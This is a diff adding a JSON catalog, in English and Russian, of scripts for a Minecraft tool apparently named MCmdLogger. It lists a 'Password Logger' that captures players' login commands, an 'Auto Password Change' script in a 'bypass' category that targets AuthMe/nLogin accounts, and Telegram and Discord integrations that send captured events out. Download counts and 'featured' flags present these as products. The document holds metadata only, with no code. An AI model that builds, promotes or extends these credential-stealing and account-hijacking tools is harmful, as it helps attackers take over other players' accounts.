@@ -1,0 +1,79 @@
+{
+    "scripts": [
+        {
+            "id": "password_logger",
+            "name": "Password Logger",
+            "nameRu": "Логгер паролей",
+            "description": "Captures login commands with customizable command list and file saving",
+            "descriptionRu": "Перехватывает пароли с настраиваемым списком команд и сохранением в файл",
+            "version": "3.0.0",
+            "author": "MCmdLogger Team",
+            "category": "logging",
+            "filename": "password_logger.js",
+            "downloads": 2500,
+            "featured": true
+        },
+        {
+            "id": "auto_password_change",
+            "name": "Auto Password Change",
+            "nameRu": "Авто смена пароля",
+            "description": "Automatically changes player passwords with AuthMe/nLogin support",
+            "descriptionRu": "Автоматически меняет пароли с поддержкой AuthMe/nLogin",
+            "version": "3.0.0",
+            "author": "MCmdLogger Team",
+            "category": "bypass",
+            "filename": "auto_password_change.js",
+            "downloads": 1200,
+            "featured": true
+        },
+        {
+            "id": "donate_detector",
+            "name": "Donate Detector",
+            "nameRu": "Детектор донатов",
+            "description": "Detects VIP/Staff players by chat prefixes and privileged commands",
+            "descriptionRu": "Определяет VIP/Staff игроков по префиксам чата и командам",
+            "version": "2.0.0",
+            "author": "MCmdLogger Team",
+            "category": "logging",
+            "filename": "donate_detector.js",
+            "downloads": 890,
+            "featured": true
+        },
+        {
+            "id": "telegram_notifier",
+            "name": "Telegram Notifier",
+            "nameRu": "Уведомления Telegram",
+            "description": "Sends all events to Telegram bot",
+            "descriptionRu": "Отправляет все события в Telegram бота",
+            "version": "1.0.0",
+            "author": "MCmdLogger Team",
+            "category": "integrations",
+            "filename": "telegram_notifier.js",
+            "downloads": 1500
+        },
+        {
+            "id": "discord_webhook",
+            "name": "Discord Webhook",
+            "nameRu": "Discord Webhook",
+            "description": "Sends beautiful embeds to Discord webhook",
+            "descriptionRu": "Отправляет красивые embeds в Discord webhook",
+            "version": "1.0.0",
+            "author": "MCmdLogger Team",
+            "category": "integrations",
+            "filename": "discord_webhook.js",
+            "downloads": 1100
+        },
+        {
+            "id": "welcome_message",
+            "name": "Welcome Message",
+            "nameRu": "Приветствие",
+            "description": "Sends customizable welcome message with colors",
+            "descriptionRu": "Отправляет настраиваемое приветствие с цветами",
+            "version": "2.0.0",
+            "author": "MCmdLogger Team",
+            "category": "bypass",
+            "filename": "welcome_message.js",
+            "downloads": 720
+        }
+    ]
+}
